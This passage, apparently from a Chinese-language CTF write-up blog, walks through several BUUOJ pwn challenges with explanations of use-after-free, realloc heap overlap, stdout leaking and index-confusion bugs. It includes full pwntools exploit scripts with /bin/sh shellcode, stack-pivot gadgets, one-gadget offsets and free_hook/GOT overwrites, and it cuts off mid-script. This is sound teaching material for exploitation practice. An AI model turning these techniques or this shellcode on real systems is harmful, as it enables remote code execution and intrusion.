class="hljs"><pre><code class="hljs undefined">Payload = shellcode + jmp esp<span class="hljs-built_in"> address </span>+ sub esp,esp + jmp esp</code></pre></div><p>其实基本都是一样的，后面跟上的，也可以理解为调整esp指针的shellcode。</p><h3 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_s_9'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26283</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()jmp_esp = <span class="hljs-number">0x08048554</span>shellcode= <span class="hljs-string">'\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'</span>shellcode = shellcode.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">'\x00'</span>)gadgets = asm(<span class="hljs-string">'sub esp,0x28;jmp esp'</span>)print(gadgets)payload = shellcode + p32(jmp_esp) + gadgets<span class="hljs-comment"># debug()</span>sl(payload)itr()</code></pre></div><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a><code>roarctf_2019_realloc_magic</code></h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><h4 id="漏洞点-4"><a href="#漏洞点-4" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>UAF</li></ul><p>程序用realloc函数来分配堆块，因为不熟悉这个搞的我，好久没有做出来。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="realloc的特点"><a href="#realloc的特点" class="headerlink" title="realloc的特点"></a>realloc的特点</h4><p>基础功能是改变<code>mem_address</code>所指内存区域的大小为newsize长度。这里就有几种不同的情况</p><ul><li>1.当size为0，这时就相当于free()函数，同时返回值为null</li><li>2.当指针为0，size大于0，相当于malloc函数</li><li>3.size小于等于原来的size，则在原先的基础上缩小，多余的堆块free掉</li><li>4.size大于原来的size，如果<strong>有足够空间</strong>就原基础扩充，空间不足则分配新的内存，并将原来指针指向的堆块旧内容复制到新的堆块内存中，然后再将原来的堆块free掉。</li></ul><p>其中第4点，有足够空间，画图解释一下：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p><p>由于这个特性，来制作3个堆块A、B、C，B堆块作为进入unsortbin的堆块存在，C是为了防止不让C合并top chunk，然后用A来申请一个size&lt;=（A的size + B的size）的堆块，这样就造成了堆块的重叠。</p><h4 id="利用-IO-2-1-stdout-来泄漏信息"><a href="#利用-IO-2-1-stdout-来泄漏信息" class="headerlink" title="利用 _IO_2_1_stdout_ 来泄漏信息"></a><code>利用 _IO_2_1_stdout_ 来泄漏信息</code></h4><p>参考链接：<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p>这个题因为有过输出，其<code>_IO_CURRENTLY_PUTTING</code>就是为1的 ，对于<code>_IO_IS_APPENDING</code>这个flag的值，将这个flag搞成1之后，就可以通过修改<code>_IO_buf_base</code>来完成leak。</p><p>在赛题中，很多程序都是用过输出函数进行输出的，基本就是改掉flag，中间的三个变量在输出的过程中都不怎么用得到，直接盖成0,低位覆盖<code>_IO_buf_base</code>为合适的值就可以完成leak。</p><p>Flag 怎么设置，在赛题中还是很随意的：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0xfbad1887</span><span class="hljs-number">0xfbad3c80</span></code></pre></div><p>重点就是让<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p><p>大体的利用方法就是利用unsorted bin的在tcache或fastbin的fd上留下<code>main_arena</code>的地址，由于<code>_IO_2_1_stdout_</code>与<code>arena</code>只相差4位，且低三位已知，在传入是低3位覆盖fd留下的<code>main_arena</code>的地址，剩余一位可以爆破，概率1/16,从而劫持stdout以达到泄露的目的 。</p><h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./roarctf_2019_realloc_magic'</span>elf = ELF(local_file)<span class="hljs-comment"># context.log_level = 'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)    libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'?'</span>,str(size))    <span class="hljs-keyword">if</span> int(size) != <span class="hljs-number">0</span> :        sa(<span class="hljs-string">'?'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'aaaaaaa'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'aaaaaaaa'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)    add(<span class="hljs-number">0x110</span>,<span class="hljs-string">' '</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'a'</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):        free()    add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x60\x87'</span>)    payload = <span class="hljs-number">17</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">'\x60\x87'</span>    add(<span class="hljs-number">0x190</span>,payload)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    add(<span class="hljs-number">0x100</span>,<span class="hljs-string">'\x60\x87'</span>)    add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)    payload = p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x100</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./roarctf_2019_realloc_magic')</span>        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28690</span>)        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">4110208</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">4118760</span> + libc_basesys_addr = <span class="hljs-number">324832</span>+libc_basesla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'666'</span>)add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'aaaaaaa'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'aaaaaaaa'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">0x160</span>,<span class="hljs-string">' '</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free()add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x120</span>,<span class="hljs-string">'\x60\x87'</span>)payload = <span class="hljs-number">37</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(free_hook)add(<span class="hljs-number">0x260</span>,payload)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)add(<span class="hljs-number">0x130</span>,<span class="hljs-string">'a'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-string">''</span>)one_rec = rce18[<span class="hljs-number">1</span>] +libc_baseadd(<span class="hljs-number">0x130</span>,p64(one_rec))free()<span class="hljs-comment"># debug()</span>itr()</code></pre></div><p>其中exp的爆破stdout部分，可以当作模版使用，来自pzhxbz大佬的。</p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>常规堆题，UAF，dup打<code>free_hook_</code>。上来用<code>puts(&amp;s)</code>，来泄漏栈上存在的libc地址。</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_en_3'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29542</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'story'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x20</span><span class="hljs-number">-8</span>)sa(<span class="hljs-string">'name'</span>,payload)sa(<span class="hljs-string">'ID'</span>,<span class="hljs-string">'chumen77'</span>)ru(<span class="hljs-string">'chumen77'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x81237</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)add(<span class="hljs-number">0x50</span>,<span class="hljs-string">'aaaaaaaa'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>add(<span class="hljs-number">0x50</span>,p64(free_hook))add(<span class="hljs-number">0x50</span>,p64(free_hook))rec = rce18[<span class="hljs-number">1</span>] + libc_baseadd(<span class="hljs-number">0x50</span>,p64(rec))free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="极客大挑战2019-Not-bad"><a href="#极客大挑战2019-Not-bad" class="headerlink" title="极客大挑战2019 Not bad"></a>极客大挑战2019 Not bad</h2><h3 id="分析-21"><a href="#分析-21" class="headerlink" title="分析"></a>分析</h3><p>溢出0x18个字节，加上本身的栈长度，读orw 的shellcode内存不是很够用。需要迁移到mmap，进行orw。所以摆在栈上的shellcode就是，来一个read函数，把orw放在mmap上，然后再跳转上去执行即可。并且再次用到 <code>jmp rsp</code> + shellcode.</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bad'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29794</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()mmap = <span class="hljs-number">0x123000</span>jmp_rsp = <span class="hljs-number">0x0000000000400a01</span><span class="hljs-comment"># bss = 0x6010B0 - 0x20</span>orw = asm(shellcraft.open(<span class="hljs-string">"./flag"</span>))orw += asm(shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))orw += asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">"rsp"</span>,<span class="hljs-number">0x30</span>))payload = asm(shellcraft.read(<span class="hljs-number">0</span>,mmap + <span class="hljs-number">0x300</span>,<span class="hljs-number">0x100</span>)) + asm(<span class="hljs-string">'mov rax,0x123300;call rax'</span>)payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>)payload += p64(jmp_rsp) +   asm(<span class="hljs-string">'sub rsp,0x30;jmp rsp'</span>)sa(<span class="hljs-string">'fun'</span>,payload)s(orw)itr()</code></pre></div><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="分析-22"><a href="#分析-22" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>保护开的不多，分析和利用起来简单不少。</p><p>这个题难点就是在于发现漏洞点。</p><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><div class="hljs"><pre><code class="hljs c">__int64 result; <span class="hljs-comment">// rax</span> <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span> <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span> <span class="hljs-keyword">int</span> idx; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span> <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">"index: "</span>); idx = read_int(); <span class="hljs-keyword">if</span> ( idx &lt; <span class="hljs-number">0</span> || idx &gt; <span class="hljs-number">16</span> ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"index is invalid."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"size: "</span>); size = read_int(); <span class="hljs-keyword">if</span> ( size &lt; <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0x1000</span> ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"size is invalid."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; buf = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-keyword">if</span> ( !buf ) &#123;   <span class="hljs-built_in">puts</span>(<span class="hljs-string">"malloc error."</span>);   <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>); &#125; <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>); read(<span class="hljs-number">0</span>, buf, size); show_diy((__int16)buf);</code></pre></div><p>可以自定义输入堆的编号，最大可以17个，就感觉有点奇怪。然后以栈上的一个buf来存取分配heap的地址。</p><div class="hljs"><pre><code class="hljs c">result = sub_400AB0((__int64)buf, idx);  v5 = result;  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i )  &#123;    result = heaplist_idx[i];    <span class="hljs-keyword">if</span> ( !result )    &#123;      heaplist_idx[i] = v5;      result = i;      sizelist[i] = size;      <span class="hljs-keyword">break</span>;    &#125;  &#125;</code></pre></div><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_400AB0</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2)</span></span>&#123;  <span class="hljs-keyword">return</span> a1 | a2;&#125;</code></pre></div><p>可以看到以堆地址与堆的id进行以来一个<code>|</code> 运算。然后返回回来给v5，然后在存入bss的一段地址中。算是处理过的堆地址。</p><p>尝试研究一下，做完处理是什么样子：</p><p>先分配一个堆号为1 和 16的堆块，看下bss里面是存入了什么。</p><div class="hljs"><pre><code class="hljs undefined">x/<span class="hljs-number">30</span>gx  <span class="hljs-number">0x6020E0</span><span class="hljs-number">0x6020e0</span>:       <span class="hljs-number">0x0000000000e35270</span>(<span class="hljs-number">16</span>)      <span class="hljs-number">0x0000000000e35281</span>(<span class="hljs-number">0</span>)</code></pre></div><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">2</span>]: hex(<span class="hljs-number">0x0e35260</span> | <span class="hljs-number">16</span>)Out[<span class="hljs-number">2</span>]: <span class="hljs-string">'0xe35270'</span>In [<span class="hljs-number">3</span>]: hex(<span class="hljs-number">0x00e35281</span> | <span class="hljs-number">0</span>)Out[<span class="hljs-number">3</span>]: <span class="hljs-string">'0xe35281'</span></code></pre></div><p>差不多就是这样，但是也可以发现点异样。因为是<code>|</code> 的逻辑运算，在<code>0-0xf</code>是一个轮回后，到了16就又算是一个轮回。<br>既然处理过堆地址，那肯定取出来进行操作时，肯定还会再进行处理回来。下面就是注意怎么处理的。</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">16</span>; ++i ) &#123;   result = get_idx(heaplist_idx[i]);   <span class="hljs-keyword">if</span> ( result == idx )   &#123;     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"content: "</span>);     read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);     result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">"edit success.\n"</span>);     <span class="hljs-keyword">break</span>;   &#125; &#125;</code></pre></div><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">get_idx</span><span class="hljs-params">(<span class="hljs-keyword">char</span> a1)</span></span>&#123;  <span class="hljs-keyword">return</span> a1 &amp; <span class="hljs-number">0xF</span>;&#125;</code></pre></div><p>可以看到其是依次0-17编号对堆块进行遍历取出，再取出时会对其进行<code>&amp; 0xf</code>的操作来尝试获取堆块的编号。</p><p>来测试一下：</p><div class="hljs"><pre><code class="hljs c">In [5]: hex(0x00e35281 &amp; 0xf). #1号堆块的计算Out[5]: '0x1'In [6]: hex(0x00e35270 &amp; 0xf) #16号堆块的计算Out[6]: '0x0'</code></pre></div><p>这就很明显有异样了，申请的是16号堆块其认为是0号堆块。所以申请16号的堆块，其可以用edit（0）来进行编辑16号堆块。</p><p>然后看其如何编辑的：</p><div class="hljs"><pre><code class="hljs c">read_diy((<span class="hljs-keyword">void</span> *)(heaplist_idx[i] &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>LL), sizelist[i]);</code></pre></div><p>其是根据bss上存的处理过堆块地址进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code> 来进行编辑的。<br>对于上来就申请了一个16号的堆块，很容易知道其堆块的末3为应该是0x260，但是当时存入的是0x270，尝试进行一下<code>&amp; 0xFFFFFFFFFFFFFFF0</code>：</p><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">7</span>]: hex(<span class="hljs-number">0x00e35270</span> &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFF0</span>)Out[<span class="hljs-number">7</span>]: <span class="hljs-string">'0xe35270'</span></code></pre></div><p>发现并不是从0x260进行编辑，但是同样还是可以编辑同样的size，所以这就造成了溢出，并且是0x10个字节。</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li>释放2个tcache 堆块，并且利用0x10字节，改其中一个堆块的fd，改为free的got位置</li><li>申请堆块到free got处，改free 为 puts</li><li>构造出一个unsortbin的堆块，然后再申请一个堆块，就会在这个堆块上留下部分的libc地址，然后进行leak</li><li>算出system的地址，继续改free got 处为 system，然后free一个带有<code>/bin/sh\x00</code>的堆块，即可拿到shell</li></ul><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_5'</span>elf = ELF(local_file)<span class="hljs-comment"># context.log_level = 'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27180</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  